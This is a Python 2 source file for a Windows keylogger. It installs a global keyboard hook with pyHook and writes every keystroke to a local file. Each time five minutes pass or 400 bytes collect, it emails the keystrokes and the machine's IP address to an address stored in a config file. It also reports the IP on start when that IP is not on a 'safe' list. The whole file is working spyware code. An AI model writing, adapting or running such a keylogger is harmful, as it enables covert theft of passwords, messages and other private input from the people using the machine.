from __future__ import print_function
from utility.network_utility import get_own_ip, internet_on
from notification.email_service import EmailService
from notification.email_service import Message
import pyHook, pythoncom, sys
import datetime
import sys
import time
import urllib2
import json
from multiprocessing import Process, Pipe
import os

curr_dir = os.path.dirname(os.path.realpath(__file__))
file_log = curr_dir+r'\keylog.txt'
file_safe_ips = curr_dir+r'\safeips.txt'
file_config = curr_dir+r'\config.txt'
f_conf = open(file_config, 'a+')
f_ips = open(file_safe_ips, 'a+')
f = open(file_log, 'a+')
f.seek(0)
f.truncate()
last_sent = datetime.datetime.now()
system_is_safe = False

#proc 1
def on_keyboard_event(event):
    global_pipe.send(chr(event.Ascii))
    #print(chr(event.Ascii), end="")

    return True

#proc 2
def get_permission_to_send():
    current_time = datetime.datetime.now()
    delta = current_time - last_sent

    buffer_size = f.tell()

    # print('f.tell():', buffer_size)
    # print('DELTA:', delta.seconds)
    if delta.seconds > 300 or buffer_size > 400:
        return True

#proc 2
def send_email(body):
    f_conf.seek(0)
    args = f_conf.read().split(',')
    username = args[0]
    send_to = args[1]
    password = args[2]
    message = Message(send_to, username, args[3], body)
    sender = EmailService()
    sender.send(message, username, password)


#proc 1
def init_logging(pipe):
    global global_pipe
    global_pipe = pipe
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = on_keyboard_event
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()


if internet_on():
    try:
        curr_ip = get_own_ip()
        f_ips.seek(0)
        safe_ips = f_ips.read().split(',')
        if curr_ip not in safe_ips:
            system_is_safe = False
            send_email(get_own_ip())
        else:
            system_is_safe = True
    except:
        pass

if not system_is_safe:
    if __name__ == '__main__':
        sender_proc, receiver_proc = Pipe()
        p = Process(target=init_logging, args=(sender_proc, ))
        p.start()

        while True:
            time.sleep(0.2)
            if receiver_proc.poll():
                character = receiver_proc.recv()
                f.write(character)
                #print('received char:', character)

            if get_permission_to_send() and internet_on():
                ip = get_own_ip()
                f.seek(0)
                keystrokes = f.read()
                send_email(ip + '\n' + keystrokes)
                last_sent = datetime.datetime.now()
                f.seek(0)
                f.truncate()






